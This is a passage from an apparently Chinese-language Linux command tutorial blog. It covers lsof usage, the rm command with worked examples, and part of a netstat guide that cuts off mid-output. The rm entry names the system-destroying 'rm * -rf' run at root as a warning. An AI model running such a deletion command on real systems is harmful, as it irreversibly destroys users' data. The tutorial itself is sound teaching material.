（9）mem：memory-mapped file; （10）mmap：memory-mapped device; （11）pd：parent directory; （12）rtd：root directory; （13）tr：kernel trace file (OpenBSD); （14）v86 VP/ix mapped file; （15）0：表示标准输出 （16）1：表示标准输入 （17）2：表示标准错误 一般在标准输出、标准错误、标准输入后还跟着文件状态模式：r、w、u等 （1）u：表示该文件被打开并处于读取/写入模式 （2）r：表示该文件被打开并处于只读模式 （3）w：表示该文件被打开并处于 （4）空格：表示该文件的状态模式为unknow，且没有锁定 （5）-：表示该文件的状态模式为unknow，且被锁定 同时在文件状态模式后面，还跟着相关的锁 （1）N：for a Solaris NFS lock of unknown type; （2）r：for read lock on part of the file; （3）R：for a read lock on the entire file; （4）w：for a write lock on part of the file;（文件的部分写锁） （5）W：for a write lock on the entire file;（整个文件的写锁） （6）u：for a read and write lock of any length; （7）U：for a lock of unknown type; （8）x：for an SCO OpenServer Xenix lock on part of the file; （9）X：for an SCO OpenServer Xenix lock on the entire file; （10）space：if there is no lock. TYPE：文件类型，如DIR、REG等，常见的文件类型 （1）DIR：表示目录 （2）CHR：表示字符类型 （3）BLK：块设备类型 （4）UNIX： UNIX 域套接字 （5）FIFO：先进先出 (FIFO) 队列 （6）IPv4：网际协议 (IP) 套接字 DEVICE：指定磁盘的名称 SIZE：文件的大小 NODE：索引节点（文件在磁盘上的标识） NAME：打开文件的确切名称 实例2：查看谁正在使用某个文件，也就是说查找某个文件相关的进程&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof /bin/bash &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456[root@localhost ~]# lsof /bin/bashCOMMAND PID USER FD TYPE DEVICE SIZE NODE NAMEbash 24159 root txt REG 8,2 801528 5368780 /bin/bashbash 24909 root txt REG 8,2 801528 5368780 /bin/bashbash 24941 root txt REG 8,2 801528 5368780 /bin/bash[root@localhost ~]# 实例3：递归查看某个目录的文件信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof test/test3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456[root@localhost ~]# cd /opt/soft/[root@localhost soft]# lsof test/test3COMMAND PID USER FD TYPE DEVICE SIZE NODE NAMEbash 24941 root cwd DIR 8,2 4096 2258872 test/test3vi 24976 root cwd DIR 8,2 4096 2258872 test/test3[root@localhost soft]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用了+D，对应目录下的所有子目录和文件都会被列出 实例4：不使用+D选项，遍历查看某个目录的所有文件信息的方法&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof |grep 'test/test3' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost soft]# lsof |grep 'test/test3'bash 24941 root cwd DIR 8,2 4096 2258872 /opt/soft/test/test3vi 24976 root cwd DIR 8,2 4096 2258872 /opt/soft/test/test3vi 24976 root 4u REG 8,2 12288 2258882 /opt/soft/test/test3/.log2013.log.swp[root@localhost soft]# 实例5：列出某个用户打开的文件信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof -u username &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-u 选项，u其实是user的缩写 实例6：列出某个程序进程所打开的文件信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof -c mysql &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-c 选项将会列出所有以mysql这个进程开头的程序的文件，其实你也可以写成 lsof | grep mysql, 但是第一种方法明显比第二种方法要少打几个字符了 实例7：列出多个进程多个打开的文件信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof -c mysql -c apache 实例8：列出某个用户以及某个进程所打开的文件信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof -u test -c mysql &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用户与进程可相关，也可以不相关 实例9：列出除了某个用户外的被打开的文件信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof -u ^root &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;^这个符号在用户名之前，将会把是root用户打开的进程不让显示 实例10：通过某个进程号显示该进行打开的文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof -p 1 实例11：列出多个进程号对应的文件信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof -p 1,2,3 实例12：列出除了某个进程号，其他进程号所打开的文件信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof -p ^1 实例13：列出所有的网络连接&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof -i 实例14：列出所有tcp 网络连接信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof -i tcp 实例15：列出所有udp网络连接信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof -i udp 实例16：列出谁在使用某个端口&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof -i :3306 实例17：列出谁在使用某个特定的udp端口&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof -i udp:55 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或者：特定的tcp端口 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof -i tcp:80 实例18：列出某个用户的所有活跃的网络端口&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof -a -u test -i 实例19：列出所有网络文件系统&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof -N 实例20：域名socket文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof -u 实例21：某个用户组所打开的文件信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof -g 5555 实例22：根据文件描述列出对应的文件信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1234lsof -d description(like 2)例如：lsof -d txt例如：lsof -d 1例如：lsof -d 2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;0表示标准输入，1表示标准输出，2表示标准错误，从而可知：所以大多数应用程序所打开的文件的 FD 都是从 3 开始 实例23：根据文件描述范围列出文件信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof -d 2-3 实例24：列出COMMAND列中包含字符串” sshd”，且文件描符的类型为txt的文件信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof -c sshd -a -d txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678[root@localhost soft]# lsof -c sshd -a -d txtCOMMAND PID USER FD TYPE DEVICE SIZE NODE NAMEsshd 2756 root txt REG 8,2 409488 1027867 /usr/sbin/sshdsshd 24155 root txt REG 8,2 409488 1027867 /usr/sbin/sshdsshd 24905 root txt REG 8,2 409488 1027867 /usr/sbin/sshdsshd 24937 root txt REG 8,2 409488 1027867 /usr/sbin/sshd[root@localhost soft]# [root@localhost soft]# 实例25：列出被进程号为1234的进程所打开的所有IPV4 network files&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof -i 4 -a -p 1234 实例26：列出目前连接主机peida.linux上端口为：20，21，22，25，53，80相关的所有文件信息，且每隔3秒不断的执行lsof指令&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof -i @peida.linux:20,21,22,25,53,80 -r 3]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- rm]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F6.%20Linux%20%E5%91%BD%E4%BB%A4-%20rm%2F</url>
    <content type="text"><![CDATA[Linux 命令- rm&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;linux中删除文件和目录的命令： rm命令。rm是常用的命令，该命令的功能为删除一个目录中的一个或多个文件或目录，它也可以将某个目录及其下的所有文件及子目录均删除。对于链接文件，只是删除了链接，原有文件均保持不变。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;rm是一个危险的命令，使用的时候要特别当心，尤其对于新手，否则整个系统就会毁在这个命令（比如在/（根目录）下执行rm * -rf）。所以，我们在执行rm之前最好先确认一下在哪个目录，到底要删除什么东西，操作时保持高度清醒的头脑。 1．命令格式：1rm [选项] [文件] 2．命令功能：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;删除一个目录中的一个或多个文件或目录，如果没有使用- r选项，则rm不会删除目录。如果使用 rm 来删除文件，通常仍可以将该文件恢复原状。 3．命令参数： -f, –force 忽略不存在的文件，从不给出提示。 -i, –interactive 进行交互式删除 -r, -R, –recursive 指示rm将参数中列出的全部目录和子目录均递归地删除。 -v, –verbose 详细显示进行的步骤 –help 显示此帮助信息并退出 –version 输出版本信息并退出 4．命令实例：实例1：删除文件file，系统会先询问是否删除。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1rm [文件名] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 1234567[root@localhost test1]# ll总计 4-rw-r--r-- 1 root root 56 10-26 14:31 log.logroot@localhost test1]# rm log.log rm：是否删除 一般文件 “log.log”? yroot@localhost test1]# ll总计 0[root@localhost test1]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输入rm log.log命令后，系统会询问是否删除，输入y后就会删除文件，不想删除则数据n。 实例2：强行删除file，系统不再提示。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1rm -f log1.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 1234567[root@localhost test1]# ll总计 4-rw-r--r-- 1 root root 23 10-26 14:40 log1.log[root@localhost test1]# rm -f log1.log [root@localhost test1]# ll总计 0[root@localhost test1]# 实例3：删除任何.log文件；删除前逐一询问确认&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1rm -i *.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 12345678910[root@localhost test1]# ll总计 8-rw-r--r-- 1 root root 11 10-26 14:45 log1.log-rw-r--r-- 1 root root 24 10-26 14:45 log2.log[root@localhost test1]# rm -i *.logrm：是否删除 一般文件 “log1.log”? yrm：是否删除 一般文件 “log2.log”? y[root@localhost test1]# ll总计 0[root@localhost test1]# 实例4：将 test1子目录及子目录中所有档案删除&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1rm -r test1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 12345678910111213141516171819[root@localhost test]# ll总计 24drwxr-xr-x 7 root root 4096 10-25 18:07 scfdrwxr-xr-x 2 root root 4096 10-26 14:51 test1drwxr-xr-x 3 root root 4096 10-25 17:44 test2drwxrwxrwx 2 root root 4096 10-25 17:46 test3drwxr-xr-x 2 root root 4096 10-25 17:56 test4drwxr-xr-x 3 root root 4096 10-25 17:56 test5[root@localhost test]# rm -r test1rm：是否进入目录 “test1”? yrm：是否删除 一般文件 “test1/log3.log”? yrm：是否删除 目录 “test1”? y[root@localhost test]# ll总计 20drwxr-xr-x 7 root root 4096 10-25 18:07 scfdrwxr-xr-x 3 root root 4096 10-25 17:44 test2drwxrwxrwx 2 root root 4096 10-25 17:46 test3drwxr-xr-x 2 root root 4096 10-25 17:56 test4drwxr-xr-x 3 root root 4096 10-25 17:56 test5[root@localhost test]# 实例5：rm -rf test2命令会将 test2 子目录及子目录中所有档案删除,并且不用一一确认&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1rm -rf test2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 12345678[root@localhost test]# rm -rf test2[root@localhost test]# ll总计 16drwxr-xr-x 7 root root 4096 10-25 18:07 scfdrwxrwxrwx 2 root root 4096 10-25 17:46 test3drwxr-xr-x 2 root root 4096 10-25 17:56 test4drwxr-xr-x 3 root root 4096 10-25 17:56 test5[root@localhost test]# 实例6：删除以 -f 开头的文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1rm -- -f &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 12345678910111213[root@localhost test]# touch -- -f[root@localhost test]# ls -- -f-f[root@localhost test]# rm -- -frm：是否删除 一般空文件 “-f”? y[root@localhost test]# ls -- -fls: -f: 没有那个文件或目录[root@localhost test]#也可以使用下面的操作步骤:[root@localhost test]# touch ./-f[root@localhost test]# ls ./-f./-f[root@localhost test]# rm ./-frm：是否删除 一般空文件 “./-f”? y[root@localhost test]# 实例7：自定义回收站功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1myrm()&#123; D=/tmp/$(date +%Y%m%d%H%M%S); mkdir -p $D; mv "$@" $D &amp;&amp; echo "moved to $D ok"; &#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 12345678910111213141516171819202122[root@localhost test]# myrm()&#123; D=/tmp/$(date +%Y%m%d%H%M%S); mkdir -p $D; mv "$@" $D &amp;&amp; echo "moved to $D ok"; &#125;[root@localhost test]# alias rm='myrm'[root@localhost test]# touch 1.log 2.log 3.log[root@localhost test]# ll总计 16-rw-r--r-- 1 root root 0 10-26 15:08 1.log-rw-r--r-- 1 root root 0 10-26 15:08 2.log-rw-r--r-- 1 root root 0 10-26 15:08 3.logdrwxr-xr-x 7 root root 4096 10-25 18:07 scfdrwxrwxrwx 2 root root 4096 10-25 17:46 test3drwxr-xr-x 2 root root 4096 10-25 17:56 test4drwxr-xr-x 3 root root 4096 10-25 17:56 test5[root@localhost test]# rm [123].logmoved to /tmp/20121026150901 ok[root@localhost test]# ll总计 16drwxr-xr-x 7 root root 4096 10-25 18:07 scfdrwxrwxrwx 2 root root 4096 10-25 17:46 test3drwxr-xr-x 2 root root 4096 10-25 17:56 test4drwxr-xr-x 3 root root 4096 10-25 17:56 test5[root@localhost test]# ls /tmp/20121026150901/1.log 2.log 3.log[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上面的操作过程模拟了回收站的效果，即删除文件的时候只是把文件放到一个临时目录中，这样在需要的时候还可以恢复过来。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;参考资料：我使用过的Linux命令之rm - 删除文件或目录]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- netstat]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F58.%20Linux%20%E5%91%BD%E4%BB%A4-%20netstat%2F</url>
    <content type="text"><![CDATA[Linux 命令- netstat&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;netstat命令用于显示与IP、TCP、UDP和ICMP协议相关的统计数据，一般用于检验本机各端口的网络连接情况。netstat是在内核中访问网络及相关信息的程序，它能提供TCP连接，TCP和UDP监听，进程内存管理的相关报告。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果你的计算机有时候接收到的数据报导致出错数据或故障，你不必感到奇怪，TCP/IP可以容许这些类型的错误，并能够自动重发数据报。但如果累计的出错情况数目占到所接收的IP数据报相当大的百分比，或者它的数目正迅速增加，那么你就应该使用netstat查一查为什么会出现这些情况了。 1．命令格式1netstat [-acCeFghilMnNoprstuvVwx] [-A&lt;网络类型&gt;] [--ip] 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;netstat用于显示与IP、TCP、UDP和ICMP协议相关的统计数据，一般用于检验本机各端口的网络连接情况。 3．命令参数 -a或–all 显示所有连线中的Socket。 -A&lt;网络类型&gt;或–&lt;网络类型&gt; 列出该网络类型连线中的相关地址。 -c或–continuous 持续列出网络状态。 -C或–cache 显示路由器配置的快取信息。 -e或–extend 显示网络其他相关信息。 -F或–fib 显示FIB。 -g或–groups 显示多重广播功能群组组员名单。 -h或–help 在线帮助。 -i或–interfaces 显示网络界面信息表单。 -l或–listening 显示监控中的服务器的Socket。 -M或–masquerade 显示伪装的网络连线。 -n或–numeric 直接使用IP地址，而不通过域名服务器。 -N或–netlink或–symbolic 显示网络硬件外围设备的符号连接名称。 -o或–timers 显示计时器。 -p或–programs 显示正在使用Socket的程序识别码和程序名称。 -r或–route 显示Routing Table。 -s或–statistice 显示网络工作信息统计表。 -t或–tcp 显示TCP传输协议的连线状况。 -u或–udp 显示UDP传输协议的连线状况。 -v或–verbose 显示指令执行过程。 -V或–version 显示版本信息。 -w或–raw 显示RAW传输协议的连线状况。 -x或–unix 此参数的效果和指定”-A unix”参数相同。 –ip或–inet 此参数的效果和指定”-A inet”参数相同。 4．使用实例实例1：无参数使用&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1netstat &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314[root@localhost ~]# netstatActive Internet connections (w/o servers)Proto Recv-Q Send-Q Local Address Foreign Address State tcp 0 268 192.168.120.204:ssh 10.2.0.68:62420 ESTABLISHED udp 0 0 192.168.120.204:4371 10.58.119.119:domain ESTABLISHED Active UNIX domain sockets (w/o servers)Proto RefCnt Flags Type State I-Node Pathunix 2 [ ] DGRAM 1491 @/org/kernel/udev/udevdunix 4 [ ] DGRAM 7337 /dev/logunix 2 [ ] DGRAM 708823 unix 2 [ ] DGRAM 7539 unix 3 [ ] STREAM CONNECTED 7287 unix 3 [ ] STREAM CONNECTED 7286 [root@localhost ~]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从整体上看，netstat的输出结果可以分为两个部分： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一个是Active Internet connections，称为有源TCP连接，其中”Recv-Q”和”Send-Q”指的是接收队列和发送队列。这些数字一般都应该是0。如果不是则表示软件包正在队列中堆积。这种情况只能在非常少的情况见到。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另一个是Active UNIX domain sockets，称为有源Unix域套接口(和网络套接字一样，但是只能用于本机通信，性能可以提高一倍)。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Proto显示连接使用的协议,RefCnt表示连接到本套接口上的进程号,Types显示套接口的类型,State显示套接口当前的状态,Path表示连接到套接口的其它进程使用的路径名。 套接口类型： -t ：TCP -u ：UDP -raw ：RAW类型 –unix ：UNIX域类型 –ax25 ：AX25类型 –ipx ：ipx类型 –netrom ：netrom类型 状态说明： LISTEN：侦听来自远方的TCP端口的连接请求 SYN-SENT：再发送连接请求后等待匹配的连接请求（如果有大量这样的状态包，检查是否中招了） SYN-RECEIVED：再收到和发送一个连接请求后等待对方对连接请求的确认（如有大量此状态，估计被flood攻击了） ESTABLISHED：代表一个打开的连接 FIN-WAIT-1：等待远程TCP连接中断请求，或先前的连接中断请求的确认 FIN-WAIT-2：从远程TCP等待连接中断请求 CLOSE-WAIT：等待从本地用户发来的连接中断请求 CLOSING：等待远程TCP对连接中断的确认 LAST-ACK：等待原来的发向远程TCP的连接中断请求的确认（不是什么好东西，此项出现，检查是否被攻击） TIME-WAIT：等待足够的时间以确保远程TCP接收到连接中断请求的确认CLOSED：没有任何连接状态 实例2：列出所有端口&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1netstat -a &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617181920[root@localhost ~]# netstat -aActive Internet connections (servers and established)Proto Recv-Q Send-Q Local Address Foreign Address State tcp 0 0 localhost:smux *:* LISTEN tcp 0 0 *:svn *:* LISTEN tcp 0 0 *:ssh *:* LISTEN tcp 0 284 192.168.120.204:ssh 10.2.0.68:62420 ESTABLISHED udp 0 0 localhost:syslog *:* udp 0 0 *:snmp *:* Active UNIX domain sockets (servers and established)Proto RefCnt Flags Type State I-Node Pathunix 2 [ ACC ] STREAM LISTENING 708833 /tmp/ssh-yKnDB15725/agent.15725unix 2 [ ACC ] STREAM LISTENING 7296 /var/run/audispd_eventsunix 2 [ ] DGRAM 1491 @/org/kernel/udev/udevdunix 4 [ ] DGRAM 7337 /dev/logunix 2 [ ] DGRAM 708823 unix 2 [ ] DGRAM 7539 unix 3 [ ] STREAM CONNECTED 7287 unix 3 [ ] STREAM CONNECTED 7286 [root@localhost ~]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;显示一个所有的有效连接信息列表，包括已建立的连接（ESTABLISHED），也包括监听连接请（LISTENING）的那些连接。 实例3：显示当前UDP连接状况&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1netstat -nu &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213[root@andy ~]# netstat -nuActive Internet connections (w/o servers)Proto Recv-Q Send-Q Local Address Foreign Address State udp 0 0 ::ffff:192.168.12:53392 ::ffff:192.168.9.120:10000 ESTABLISHED udp 0 0 ::ffff:192.168.12:56723 ::ffff:192.168.9.120:10000 ESTABLISHED udp 0 0 ::ffff:192.168.12:56480 ::ffff:192.168.9.120:10000 ESTABLISHED udp 0 0 ::ffff:192.168.12:58154 ::ffff:192.168.9.120:10000 ESTABLISHED udp 0 0 ::ffff:192.168.12:44227 ::ffff:192.168.9.120:10000 ESTABLISHED udp 0 0 ::ffff:192.168.12:36954 ::ffff:192.168.9.120:10000 ESTABLISHED udp 0 0 ::ffff:192.168.12:53984 ::ffff:192.168.9.120:10000 ESTABLISHED udp 0 0 ::ffff:192.168.12:57703 ::ffff:192.168.9.120:10000 ESTABLISHED udp 0 0 ::ffff:192.168.12:53613 ::ffff:192.168.9.120:10000 ESTABLISHED [root@andy ~]# 实例4：显示UDP端口号的使用情况&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1netstat -apu &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718192021222324252627282930[root@andy ~]# netstat -apuActive Internet connections (servers and established)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name udp 0 0 *:57604 *:* 28094/java udp 0 0 *:40583 *:* 21220/java udp 0 0 *:45451 *:* 14583/java udp 0 0 ::ffff:192.168.12:53392 ::ffff:192.168.9.120:ndmp ESTABLISHED 19327/java udp 0 0 *:52370 *:* 15841/java udp 0 0 ::ffff:192.168.12:56723 ::ffff:192.168.9.120:ndmp ESTABLISHED 15841/java udp 0 0 *:44182 *:* 31757/java udp 0 0 *:48155 *:* 5476/java udp 0 0 *:59808 *:* 17333/java udp 0 0 ::ffff:192.168.12:56480 ::ffff:192.168.9.120:ndmp ESTABLISHED 28094/java udp 0 0 ::ffff:192.168.12:58154 ::ffff:192.168.9.120:ndmp ESTABLISHED 15429/java udp 0 0 *:36780 *:* 10091/java udp 0 0 *:36795 *:* 24594/java udp 0 0 *:41922 *:* 20506/java udp 0 0 ::ffff:192.168.12:44227 ::ffff:192.168.9.120:ndmp ESTABLISHED 17333/java udp 0 0 *:34258 *:* 8866/java udp 0 0 *:55508 *:* 11667/java udp 0 0 *:36055 *:* 12425/java udp 0 0 ::ffff:192.168.12:36954 ::ffff:192.168.9.120:ndmp ESTABLISHED 16532/java udp 0 0 ::ffff:192.168.12:53984 ::ffff:192.168.9.120:ndmp ESTABLISHED 20506/java udp 0 0 ::ffff:192.168.12:57703 ::ffff:192.168.9.120:ndmp ESTABLISHED 31757/java udp 0 0 ::ffff:192.168.12:53613 ::ffff:192.168.9.120:ndmp ESTABLISHED 3199/java udp 0 0 *:56309 *:* 15429/java udp 0 0 *:54007 *:* 16532/java udp 0 0 *:39544 *:* 3199/java udp 0 0 *:43900 *:* 19327/java [root@andy ~]# 实例5：显示网卡列表&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1netstat -i &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456[root@andy ~]# netstat -iKernel Interface tableIface MTU Met RX-OK RX-ERR RX-DRP RX-OVR TX-OK TX-ERR TX-DRP TX-OVR Flgeth0 1500 0 151818887 0 0 0 198928403 0 0 0 BMRUlo 16436 0 107235 0 0 0 107235 0 0 0 LRU[root@andy ~]# 实例6：显示组播组的关系&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1netstat -g &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910[root@andy ~]# netstat -gIPv6/IPv4 Group MembershipsInterface RefCnt Group--------------- ------ ---------------------lo 1 all-systems.mcast.neteth0 1 all-systems.mcast.netlo 1 ff02::1eth0 1 ff02::1:ffff:9b0ceth0 1 ff02::1[root@andy ~]# 实例7：显示网络统计信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1netstat -s &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263[root@localhost ~]# netstat -sIp: 530999 total packets received 0 forwarded 0 incoming packets discarded 530999 incoming packets delivered 8258 requests sent out 1 dropped because of missing routeIcmp: 90 ICMP messages received 0 input ICMP message failed. ICMP input histogram: destination unreachable: 17 echo requests: 1 echo replies: 72 106 ICMP messages sent 0 ICMP messages failed ICMP output histogram: destination unreachable: 8 echo request: 97 echo replies: 1IcmpMsg: InType0: 72 InType3: 17 InType8: 1 OutType0: 1 OutType3: 8 OutType8: 97Tcp: 8 active connections openings 15 passive connection openings 8 failed connection attempts 3 connection resets received 1 connections established 3132 segments received 2617 segments send out 53 segments retransmited 0 bad segments received. 252 resets sentUdp: 0 packets received 0 packets to unknown port received. 0 packet receive errors 5482 packets sentTcpExt: 1 invalid SYN cookies received 1 TCP sockets finished time wait in fast timer 57 delayed acks sent Quick ack mode was activated 50 times 60 packets directly queued to recvmsg prequeue. 68 packets directly received from backlog 4399 packets directly received from prequeue 520 packets header predicted 51 packets header predicted and directly queued to user 1194 acknowledgments not containing data received 21 predicted acknowledgments 0 TCP data loss events 1 timeouts after reno fast retransmit 9 retransmits in slow start 42 other TCP timeouts 3 connections aborted due to timeoutIpExt: InBcastPkts: 527777 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;按照各个协议分别显示其统计数据。如果我们的应用程序（如Web浏览器）运行速度比较慢，或者不能显示Web页之类的数据，那么我们就可以用本选项来查看一下所显示的信息。我们需要仔细查看统计数据的各行，找到出错的关键字，进而确定问题所在。 实例8：显示监听的套接口&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1netstat -l &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213[root@localhost ~]# netstat -lActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State tcp 0 0 localhost:smux *:* LISTEN tcp 0 0 *:svn *:* LISTEN tcp 0 0 *:ssh *:* LISTEN udp 0 0 localhost:syslog *:* udp 0 0 *:snmp *:* Active UNIX domain sockets (only servers)Proto RefCnt Flags Type State I-Node Pathunix 2 [ ACC ] STREAM LISTENING 708833 /tmp/ssh-yKnDB15725/agent.15725unix 2 [ ACC ] STREAM LISTENING 7296 /var/run/audispd_events[root@localhost ~]# 实例9：显示所有已建立的有效连接&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1netstat -n &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213[root@localhost ~]# netstat -nActive Internet connections (w/o servers)Proto Recv-Q Send-Q Local Address Foreign Address State tcp 0 268 192.168.120.204:22 10.2.0.68:62420 ESTABLISHED Active UNIX domain sockets (w/o servers)Proto RefCnt Flags Type State I-Node Pathunix 2 [ ] DGRAM 1491 @/org/kernel/udev/udevdunix 4 [ ] DGRAM 7337 /dev/logunix 2 [ ] DGRAM 708823 unix 2 [ ] DGRAM 7539 unix 3 [ ] STREAM CONNECTED 7287 unix 3 [ ] STREAM CONNECTED 7286 [root@localhost ~]# 实例10：显示关于以太网的统计数据&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1netstat -e &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213[root@localhost ~]# netstat -eActive Internet connections (w/o servers)Proto Recv-Q Send-Q Local Address Foreign Address State User Inode tcp 0 248 192.168.120.204:ssh 10.2.0.68:62420 ESTABLISHED root 708795 Active UNIX domain sockets (w/o servers)Proto RefCnt Flags Type State I-Node Pathunix 2 [ ] DGRAM 1491 @/org/kernel/udev/udevdunix 4 [ ] DGRAM 7337 /dev/logunix 2 [ ] DGRAM 708823 unix 2 [ ] DGRAM 7539 unix 3 [ ] STREAM CONNECTED 7287 unix 3 [ ] STREAM CONNECTED 7286 [root@localhost ~]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用于显示关于以太网的统计数据。它列出的项目包括传送的数据报的总字节数、错误数、删除数、数据报的数量和广播的数量。这些统计数据既有发送的数据报数量，也有接收的数据报数量。这个选项可以用来统计一些基本的网络流量） 实例11：显示关于路由表的信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1netstat -r &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678[root@localhost ~]# netstat -rKernel IP routing tableDestination Gateway Genmask Flags 